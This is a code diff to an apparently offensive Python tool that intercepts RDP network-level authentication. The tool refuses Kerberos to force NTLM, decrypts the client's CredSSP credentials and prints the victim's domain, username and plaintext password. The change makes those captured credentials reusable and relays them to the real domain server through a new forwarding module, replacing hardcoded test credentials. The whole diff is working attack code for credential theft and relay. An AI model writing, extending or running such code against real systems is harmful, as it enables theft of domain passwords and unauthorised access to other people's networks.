@@ -2,6 +2,7 @@ from TSDecode import *
 from NTLMStruct import *
 from keyManagement import *
 from ClientConnect import *
+from Forwarder import *
 import socket
 import select
 import sys
@@ -35,6 +36,7 @@ NTLMRequest= NTLMType2()
 sessionKey = b"\00"
 cipher = None
 Kerb = False
+tsp = TSPasswordCreds()
 
 #Function to refuse Kerberos on SPNEGO
 def refuseKerberos(sock,buff,options):
@@ -160,7 +162,7 @@ def step3(sock,options):
     tsc = TSCredentials()
     try :
         tsc.fromString(plain)
-        tsp = TSPasswordCreds()
+        #tsp = TSPasswordCreds()
         tsp.fromString(tsc['credentials'])
         Creds = "Credentials are: domain: "+ tsp['domainName'] + " username: " + tsp['userName'] + " password: " + tsp['password']
         print Creds
@@ -174,16 +176,11 @@ def step3(sock,options):
         print e
 
 def step4(sock,options):
-    srvsocket = clientConnect("10.63.0.21","yof","Pass1234!","pyfoot.com")
+    srvsocket = clientConnect(options.domainIP,tsp['userName'],tsp['password'],tsp['domainName'])
     print "connected to server"
-    while True:
-        ready=select.select([srvsocket],[],[],1)
-        print ready[0]
-        if ready[0]:
-            sock.send(srvsocket.recv(4096))
-        ready=select.select([sock],[],[],1)
-        if ready[0]:
-            srvsocket.send(sock.recv(4096))
+    sender(receiver(sock),srvsocket)
+    asyncore.loop()
+    time.sleep(10)
 
 SPNEGOStep = {
         1: step1,
